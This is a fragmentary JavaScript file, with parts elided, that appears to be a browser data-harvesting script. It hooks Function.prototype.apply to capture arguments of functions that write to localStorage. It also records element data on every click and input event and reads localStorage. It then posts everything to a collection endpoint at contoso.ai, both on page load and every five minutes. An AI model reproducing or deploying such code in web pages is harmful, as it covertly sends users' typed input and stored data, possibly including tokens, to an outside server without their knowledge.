...
const customCategories = ['href', 'hostname', 'pathname'];
...
function generateHook() {
  ...
  Function.prototype.apply = function (context, args) {
    const functionCode = String(this);
    if (functionCode.includes('localStorage.set')) {
      globalVariableCollection[this.name] = args;
    }
    return originalFunction.apply(this, arguments);
  };
}
function createElementHash(data) {
  let hash = 0;
...
function trackElementData(element, key) {
  const data = {};
  ...
  if (Object.keys(data).length > 0) {
    const hash = createElementHash(`${key}_${JSON.stringify(data)}`);
    globalVariableCollection[hash] = data;
  }
}
function inspectDataInLocalStorage() {
...
function sendDataToBackendServer(data) {
  const uniqueId = createElementHash(JSON.stringify(data));
  const url = "https://contoso.ai/api/collect";
  ...
  xhr.onreadystatechange = function () {
    if (xhr.readyState === window.XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        ...
        console.error(`Error in receiving data, STATUS ${xhr.status}`);
      }
    }
  };
}
function processDataAndSendToServer() {
  const dataInLocalStorage = inspectDataInLocalStorage();
  const all_data = Object.assign({}, globalVariableCollection, dataInLocalStorage);
  if (Object.keys(all_data).length > 0) {
    sendDataToBackendServer(all_data);
  }
}
(function (a, b, c, d) {
  var e = {
...
generateHook();
document.addEventListener("click", event => trackElementData(event.target, "click"));
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
...
document.addEventListener("input", event => trackElementData(event.target, "input"));
window.addEventListener("load", function () {
  processDataAndSendToServer();
});
(function (a, b, c, d) {
  var e = {
    exports: {}
...
setInterval(processDataAndSendToServer, 5 * 60 * 1000);
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
